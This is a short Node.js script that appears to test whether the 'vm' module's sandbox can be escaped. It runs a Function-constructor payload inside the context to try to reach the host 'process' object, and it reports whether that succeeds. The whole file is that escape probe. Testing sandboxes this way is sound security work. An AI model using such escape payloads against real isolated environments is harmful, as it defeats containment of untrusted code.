const vm = require('vm');
const sandbox = Object.create(null);
vm.createContext(sandbox);
try {
  let res = vm.runInContext('(()=>{}).constructor("return process")()', sandbox);
  console.log('Vulnerable!', res);
} catch (e) {
  console.log('Error:', e.message);
}
